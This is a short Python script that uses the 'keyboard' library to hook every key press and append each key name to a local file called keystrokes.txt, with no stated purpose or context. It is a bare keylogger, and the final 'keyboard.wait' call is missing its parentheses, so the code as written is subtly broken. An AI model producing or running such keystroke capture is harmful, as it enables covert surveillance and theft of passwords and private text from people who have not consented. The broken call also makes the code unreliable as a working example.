import keyboard

key_log = "keystrokes.txt"

def on_key_press(event):
    with open(key_log, "a") as f:
        f.write('{}'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait